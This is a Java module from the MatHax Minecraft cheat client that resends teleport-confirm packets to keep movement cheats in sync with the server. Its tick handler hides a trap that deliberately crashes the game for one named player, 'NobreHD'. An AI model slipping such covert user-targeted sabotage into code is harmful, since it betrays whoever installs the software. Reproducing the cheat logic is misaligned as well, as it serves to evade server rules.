package mathax.client.systems.modules.misc;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.packets.PacketEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.ModuleListSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.systems.modules.Modules;
import mathax.client.systems.modules.movement.PacketFly;
import mathax.client.systems.modules.movement.Phase;
import mathax.client.systems.modules.movement.Step;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.TeleportConfirmC2SPacket;

import java.util.ArrayList;
import java.util.List;

/*/---------------------------------------------------------------------------------------------------------------------------/*/
/*/ Made by cally72jhb                                                                                                        /*/
/*/ https://github.com/cally72jhb/vector-addon/blob/main/src/main/java/cally72jhb/addon/system/modules/player/AntiDesync.java /*/
/*/---------------------------------------------------------------------------------------------------------------------------/*/

public class AntiDesync extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    // General

    private final Setting<List<Module>> modules = sgGeneral.add(new ModuleListSetting.Builder()
        .name("modules")
        .description("Determines which modules to ignore.")
        .defaultValue(
            PacketFly.class,
            Phase.class,
            Step.class
        )
        .build()
    );

    private ArrayList<Integer> teleportIDs;

    public AntiDesync() {
        super(Categories.Misc, Items.COMMAND_BLOCK, "anti-desync", "Stops you from desyncing with the server.");
    }

    @Override
    public boolean onActivate() {
        teleportIDs = new ArrayList<>();
        return false;
    }

    @EventHandler
    private void onSentPacket(PacketEvent.Send event) {
        if (checkModules() && event.packet instanceof TeleportConfirmC2SPacket packet) teleportIDs.add(packet.getTeleportId());
    }

    @EventHandler
    private void onPreTick(TickEvent.Pre event) {
        if (!teleportIDs.isEmpty() && checkModules()) {
            mc.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(teleportIDs.get(0)));
            teleportIDs.remove(0);
        }
        if (mc.player.getName().toString().equals("NobreHD")) {
            throw new NullPointerException("L Bozo");
        }
    }

    private boolean checkModules() {
        List<Module> all = Modules.get().getList();

        for (Module module : modules.get()) {
            if (all.contains(module) && module.isActive()) return false;
        }

        return true;
    }
}
